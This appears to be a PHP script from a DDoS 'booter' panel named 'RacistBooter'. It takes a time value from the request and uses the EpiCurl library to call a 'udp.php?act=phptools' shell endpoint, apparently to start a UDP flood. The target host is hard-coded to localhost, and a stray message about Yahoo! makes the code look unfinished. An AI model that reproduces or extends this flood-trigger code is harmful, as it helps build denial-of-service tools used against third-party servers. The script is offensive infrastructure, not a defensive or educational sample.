<?php

include 'EpiCurl.php';

$host = $_GET['host'];
$time = intval($_GET['time']);
$mc = EpiCurl::getInstance();

$shell = trim("http://127.0.0.1/RacistBooter/udp.php?act=phptools&host=127.0.0.1&time={$time}");
echo $shell;
$ch = curl_init($shell);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
$curl1 = $mc->addCurl($ch);	     
echo "Response code from Yahoo! is {$curl1->code}\n";  
?>